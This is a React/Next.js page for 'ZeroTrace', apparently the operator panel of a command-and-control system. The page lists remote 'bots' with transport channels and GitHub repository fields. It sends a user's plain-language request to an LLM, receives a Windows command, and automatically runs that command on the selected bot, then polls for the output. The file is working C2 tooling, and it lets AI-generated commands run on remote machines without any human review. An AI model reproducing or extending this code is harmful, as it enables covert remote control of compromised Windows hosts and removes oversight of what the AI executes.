'use client';

import { useState, useEffect, useRef } from 'react';
import { useRouter } from 'next/navigation';
import PageLayout from '../components/PageLayout';
import LoadingScreen from '../components/LoadingScreen';
import { User, parseUserFromCookie, removeCookie } from '../utils/auth';

interface Message {
  id: string;
  type: 'ai' | 'user' | 'command' | 'output';
  content: string;
  timestamp: Date;
  command?: string;
  botUuid?: string;
}

interface Bot {
  uuid: string;
  platform: string;
  transport_channel: string;
  status: string;
  created_at: string;
  commands_file: string;
  results_file: string;
  github_username?: string;
  github_repo?: string;
  last_seen?: string;
}

export default function AIAssistantPage() {
  const [user, setUser] = useState<User | null>(null);
  const [loading, setLoading] = useState(true);
  const [messages, setMessages] = useState<Message[]>([
    {
      id: '1',
      type: 'ai',
      content: "Hello! I'm your ZeroTrace AI assistant powered by Groq GPT-OSS-120B. I can help you generate Windows commands and execute them on your bots. Ask me anything like 'print all folders in cwd' or 'show running processes'!",
      timestamp: new Date()
    }
  ]);
  const [inputMessage, setInputMessage] = useState('');
  const [isTyping, setIsTyping] = useState(false);
  const [bots, setBots] = useState<Bot[]>([]);
  const [selectedBot, setSelectedBot] = useState<string>('');
  const [loadingBots, setLoadingBots] = useState(false);
  const [isExecuting, setIsExecuting] = useState(false);
  const [isPolling, setIsPolling] = useState(false);
  const messagesEndRef = useRef<HTMLDivElement>(null);
  const router = useRouter();

  useEffect(() => {
    // Check if user is logged in via cookies
    const userInfo = parseUserFromCookie();
    if (!userInfo) {
      router.push('/');
      return;
    }

    setUser(userInfo);
    setLoading(false);
    loadBots();
  }, [router]);

  useEffect(() => {
    // Auto-scroll to bottom when new messages arrive
    messagesEndRef.current?.scrollIntoView({ behavior: 'smooth' });
  }, [messages]);

  const loadBots = async () => {
    setLoadingBots(true);
    try {
      const response = await fetch(`http://localhost:5000/bots?username=${user?.username || 'admin'}`, {
        method: 'GET',
        headers: {
          'Content-Type': 'application/json',
        },
      });

      if (response.ok) {
        const result = await response.json();
        if (result.status === 'success') {
          setBots(result.bots || []);
          if (result.bots.length > 0) {
            setSelectedBot(result.bots[0].uuid);
          }
        }
      }
    } catch (error) {
      console.error('Error loading bots:', error);
    } finally {
      setLoadingBots(false);
    }
  };

  const handleLogout = () => {
    removeCookie('user');
    router.push('/');
  };

  // Generate unique IDs to prevent React key duplication
  const generateUniqueId = () => {
    return `${Date.now()}-${Math.random().toString(36).substr(2, 9)}`;
  };

  const callGroqAPI = async (userInput: string): Promise<string> => {
    try {
      const response = await fetch('/api/ai', {
        method: 'POST',
        headers: {
          'Content-Type': 'application/json',
        },
        body: JSON.stringify({
          message: userInput
        }),
      });

      if (!response.ok) {
        const errorData = await response.json().catch(() => ({ error: 'Unknown error' }));
        console.error('AI API error:', response.status, errorData);
        throw new Error(`AI API error: ${response.status} - ${errorData.error || 'Unknown error'}`);
      }

      const data = await response.json();
      console.log('AI API response:', data);
      return data.response || 'No command generated';
    } catch (error) {
      console.error('Error calling AI API:', error);
      return 'Error generating command. Please try again.';
    }
  };

  const executeCommand = async (command: string, botUuid: string) => {
    if (!botUuid) {
      alert('Please select a bot first');
      return;
    }

    setIsExecuting(true);
    
    try {
      const response = await fetch('http://localhost:5000/execute-command', {
        method: 'POST',
        headers: {
          'Content-Type': 'application/json',
        },
        body: JSON.stringify({
          bot_uuid: botUuid,
          command: command,
          username: user?.username || 'admin'
        }),
      });

      if (response.ok) {
        const result = await response.json();
        if (result.status === 'success') {
          // Start polling for results
          setTimeout(() => {
            pollForResults(command, botUuid);
          }, 3000);
        } else {
          setMessages(prev => [...prev, {
            id: generateUniqueId(),
            type: 'output',
            content: `Error: ${result.message}`,
            timestamp: new Date(),
            command,
            botUuid
          }]);
        }
      } else {
        setMessages(prev => [...prev, {
          id: generateUniqueId(),
          type: 'output',
          content: 'Error: Failed to send command',
          timestamp: new Date(),
          command,
          botUuid
        }]);
      }
    } catch (error) {
      console.error('Error executing command:', error);
      setMessages(prev => [...prev, {
        id: generateUniqueId(),
        type: 'output',
        content: 'Error: Network error',
        timestamp: new Date(),
        command,
        botUuid
      }]);
    } finally {
      setIsExecuting(false);
    }
  };

  const pollForResults = async (command: string, botUuid: string, maxAttempts: number = 20) => {
    setIsPolling(true);
    let attempts = 0;
    
    const pollInterval = setInterval(async () => {
      attempts++;
      
      try {
        const response = await fetch(`http://localhost:5000/get-results?bot_uuid=${botUuid}&username=${user?.username || 'admin'}`, {
          method: 'GET',
          headers: {
            'Content-Type': 'application/json',
          },
        });

        if (response.ok) {
          const result = await response.json();
          if (result.status === 'success' && result.results && result.results.trim() !== '') {
            // We got results!
            setMessages(prev => [...prev, {
              id: generateUniqueId(),
              type: 'output',
              content: result.results,
              timestamp: new Date(),
              command,
              botUuid
            }]);
            
            clearInterval(pollInterval);
            setIsPolling(false);
            return;
          }
        }
        
        if (attempts >= maxAttempts) {
          clearInterval(pollInterval);
          setIsPolling(false);
          setMessages(prev => [...prev, {
            id: generateUniqueId(),
            type: 'output',
            content: `No results found after ${maxAttempts} attempts. The bot may not be responding.`,
            timestamp: new Date(),
            command,
            botUuid
          }]);
        }
      } catch (error) {
        console.error('Error polling for results:', error);
        if (attempts >= maxAttempts) {
          clearInterval(pollInterval);
          setIsPolling(false);
        }
      }
    }, 2000); // Poll every 2 seconds
  };

  const handleSendMessage = async () => {
    if (!inputMessage.trim()) return;

    const userMessage: Message = {
      id: generateUniqueId(),
      type: 'user',
      content: inputMessage,
      timestamp: new Date()
    };

    setMessages(prev => [...prev, userMessage]);
    const currentInput = inputMessage;
    setInputMessage('');
    setIsTyping(true);

    try {
      // Call Groq API to generate command
      const generatedCommand = await callGroqAPI(currentInput);
      
      // Add AI response with generated command
      const aiResponse: Message = {
        id: generateUniqueId(),
        type: 'ai',
        content: `I'll generate a Windows command for: "${currentInput}"`,
        timestamp: new Date()
      };
      
      // Add command message
      const commandMessage: Message = {
        id: generateUniqueId(),
        type: 'command',
        content: `Generated Command: ${generatedCommand}`,
        timestamp: new Date(),
        command: generatedCommand,
        botUuid: selectedBot
      };

      setMessages(prev => [...prev, aiResponse, commandMessage]);
      
      // Auto-execute the command if a bot is selected
      if (selectedBot && generatedCommand && !generatedCommand.includes('Error')) {
        await executeCommand(generatedCommand, selectedBot);
      }
      
    } catch (error) {
      console.error('Error in handleSendMessage:', error);
      const errorMessage: Message = {
        id: generateUniqueId(),
        type: 'ai',
        content: 'Sorry, I encountered an error. Please try again.',
        timestamp: new Date()
      };
      setMessages(prev => [...prev, errorMessage]);
    } finally {
      setIsTyping(false);
    }
  };

  const handleKeyPress = (e: React.KeyboardEvent) => {
    if (e.key === 'Enter' && !e.shiftKey) {
      e.preventDefault();
      handleSendMessage();
    }
  };

  const handleManualExecute = (command: string, botUuid: string) => {
    if (!botUuid) {
      alert('Please select a bot first');
      return;
    }
    executeCommand(command, botUuid);
  };

  if (loading) {
    return <LoadingScreen message="Loading AI Assistant..." />;
  }

  if (!user) {
    return null;
  }

  return (
    <PageLayout user={user} currentPage="aiassistant" onLogout={handleLogout}>
      {/* Main Content Area */}
      <main className="flex-1 flex flex-col bg-gray-950" style={{ height: 'calc(100vh - 80px)' }}>
        {/* Page Title */}
        <div className="p-4 md:p-6 border-b border-gray-700">
          <h1 className="text-2xl md:text-4xl font-mono font-bold text-green-400">AI Assistant</h1>
          <p className="text-gray-400 font-mono mt-2 text-sm md:text-base">Powered by Groq GPT-OSS-120B • Windows Command Generation</p>
        </div>

        {/* Chat Messages */}
        <div className="flex-1 p-3 md:p-4 overflow-y-auto overflow-x-hidden space-y-2 md:space-y-3 min-h-0" style={{ maxHeight: '60vh' }}>
          {messages.map((message) => (
            <div
              key={message.id}
              className={`flex items-start space-x-2 md:space-x-4 ${
                message.type === 'user' ? 'justify-end' : 'justify-start'
              }`}
            >
              {message.type === 'ai' && (
                <div className="w-8 h-8 bg-gradient-to-br from-purple-500 to-blue-500 rounded-full flex items-center justify-center text-white text-sm font-bold flex-shrink-0">
                  🤖
                </div>
              )}
              
              <div
                className={`w-full max-w-full rounded-lg p-2 ${
                  message.type === 'ai'
                    ? 'bg-gray-800 text-white'
                    : message.type === 'command'
                    ? 'bg-blue-900/20 border border-blue-500 text-blue-300'
                    : message.type === 'output'
                    ? 'bg-green-900/20 border border-green-500 text-green-300'
                    : 'bg-green-600 text-white'
                }`}
              >
                <div className="font-mono text-sm leading-relaxed">
                  {message.type === 'output' ? (
                    <div className="relative">
                      <pre className="whitespace-pre-wrap break-words break-all bg-black/20 p-1 rounded border border-gray-600 overflow-x-auto max-w-full">
                        {message.content}
                      </pre>
                      <button
                        onClick={() => navigator.clipboard.writeText(message.content)}
                        className="absolute top-2 right-2 p-1 bg-gray-700 hover:bg-gray-600 rounded text-xs text-gray-300 hover:text-white transition-colors"
                        title="Copy output"
                      >
                        📋
                      </button>
                    </div>
                  ) : (
                    message.content
                  )}
                </div>
                
                {message.type === 'command' && message.command && (
                  <div className="mt-3 flex flex-col sm:flex-row items-start sm:items-center gap-2 sm:gap-3">
                    <div className="flex gap-2">
                      <button
                        onClick={() => handleManualExecute(message.command!, message.botUuid!)}
                        disabled={isExecuting || isPolling}
                        className={`px-3 py-1 rounded text-xs font-mono transition-colors whitespace-nowrap ${
                          isExecuting || isPolling
                            ? 'bg-gray-600 text-gray-400 cursor-not-allowed'
                            : 'bg-green-600 hover:bg-green-700 text-white'
                        }`}
                      >
                        {isExecuting ? 'Executing...' : isPolling ? 'Polling...' : 'Execute'}
                      </button>
                      <button
                        onClick={() => navigator.clipboard.writeText(message.command!)}
                        className="px-2 py-1 bg-gray-600 hover:bg-gray-500 rounded text-xs text-gray-300 hover:text-white transition-colors whitespace-nowrap"
                        title="Copy command"
                      >
                        📋
                      </button>
                    </div>
                    <span className="text-xs text-gray-400">
                      Bot: {message.botUuid?.substring(0, 8)}...
                    </span>
                  </div>
                )}
                
                <div className={`text-xs mt-2 ${
                  message.type === 'ai' ? 'text-gray-400' : 
                  message.type === 'command' ? 'text-blue-200' :
                  message.type === 'output' ? 'text-green-200' :
                  'text-green-200'
                }`}>
                  {message.timestamp.toLocaleTimeString()}
                </div>
              </div>

              {message.type === 'user' && (
                <div className="w-8 h-8 bg-gradient-to-br from-green-500 to-cyan-500 rounded-full flex items-center justify-center text-white text-sm font-bold flex-shrink-0">
                  👤
                </div>
              )}
            </div>
          ))}

          {/* Typing Indicator */}
          {isTyping && (
            <div className="flex items-start space-x-4 justify-start">
              <div className="w-8 h-8 bg-gradient-to-br from-purple-500 to-blue-500 rounded-full flex items-center justify-center text-white text-sm font-bold flex-shrink-0">
                🤖
              </div>
              <div className="bg-gray-800 rounded-lg p-4">
                <div className="flex space-x-1">
                  <div className="w-2 h-2 bg-green-400 rounded-full animate-bounce"></div>
                  <div className="w-2 h-2 bg-green-400 rounded-full animate-bounce" style={{ animationDelay: '0.1s' }}></div>
                  <div className="w-2 h-2 bg-green-400 rounded-full animate-bounce" style={{ animationDelay: '0.2s' }}></div>
                </div>
              </div>
            </div>
          )}

          <div ref={messagesEndRef} />
        </div>

        {/* Bot Selection */}
        <div className="p-2 md:p-3 border-t border-gray-700 bg-gray-900 flex-shrink-0">
          <div className="flex flex-col lg:flex-row lg:items-center gap-3 lg:gap-4">
            <div className="flex-1">
              <label className="block text-gray-300 font-mono text-sm font-semibold mb-2">
                Select Bot for Command Execution:
              </label>
              {loadingBots ? (
                <div className="text-gray-400 font-mono text-sm">Loading bots...</div>
              ) : bots.length === 0 ? (
                <div className="text-gray-400 font-mono text-sm">No bots available. Create a bot first.</div>
              ) : (
                <select
                  value={selectedBot}
                  onChange={(e) => setSelectedBot(e.target.value)}
                  className="w-full bg-gray-800 border border-gray-600 rounded-lg px-3 md:px-4 py-2 text-white font-mono text-sm focus:outline-none focus:ring-2 focus:ring-green-500 focus:border-green-500"
                >
                  {bots.map((bot) => (
                    <option key={bot.uuid} value={bot.uuid}>
                      {bot.uuid.substring(0, 8)}... - {bot.platform} - {bot.status}
                    </option>
                  ))}
                </select>
              )}
            </div>
            
            {selectedBot && (
              <div className="text-left lg:text-right">
                <div className="text-gray-400 font-mono text-xs">Selected Bot:</div>
                <div className="text-green-400 font-mono text-sm">
                  {selectedBot.substring(0, 8)}... - {bots.find(b => b.uuid === selectedBot)?.platform}
                </div>
              </div>
            )}
          </div>
        </div>

        {/* Chat Input */}
        <div className="p-2 md:p-4 border-t border-gray-700 flex-shrink-0">
          <div className="flex flex-col sm:flex-row items-stretch sm:items-center gap-3 sm:gap-4">
            <div className="flex-1">
              <input
                type="text"
                value={inputMessage}
                onChange={(e) => setInputMessage(e.target.value)}
                onKeyPress={handleKeyPress}
                placeholder="Ask me to generate Windows commands... (e.g., 'print all folders in cwd', 'show running processes')"
                className="w-full bg-gray-800 border border-gray-600 rounded-lg px-3 md:px-4 py-2 md:py-3 text-white placeholder-gray-400 focus:outline-none focus:ring-2 focus:ring-green-500 focus:border-green-500 font-mono text-sm"
                disabled={isTyping}
              />
            </div>
            <button
              onClick={handleSendMessage}
              disabled={!inputMessage.trim() || isTyping}
              className={`px-4 md:px-6 py-2 md:py-3 rounded-lg font-mono text-sm font-semibold transition-all duration-200 whitespace-nowrap ${
                !inputMessage.trim() || isTyping
                  ? 'bg-gray-700 text-gray-500 cursor-not-allowed'
                  : 'bg-green-600 hover:bg-green-700 text-white'
              }`}
            >
              {isTyping ? 'Generating...' : 'SEND'}
            </button>
          </div>
          
          {/* Status Indicators */}
          <div className="mt-2 flex flex-wrap items-center gap-2 md:gap-4 text-xs font-mono">
            {isExecuting && (
              <div className="text-yellow-400">🔄 Executing command...</div>
            )}
            {isPolling && (
              <div className="text-blue-400">⏳ Polling for results...</div>
            )}
            <div className="text-gray-400">Powered by Groq GPT-OSS-120B</div>
          </div>
        </div>
      </main>
    </PageLayout>
  );
}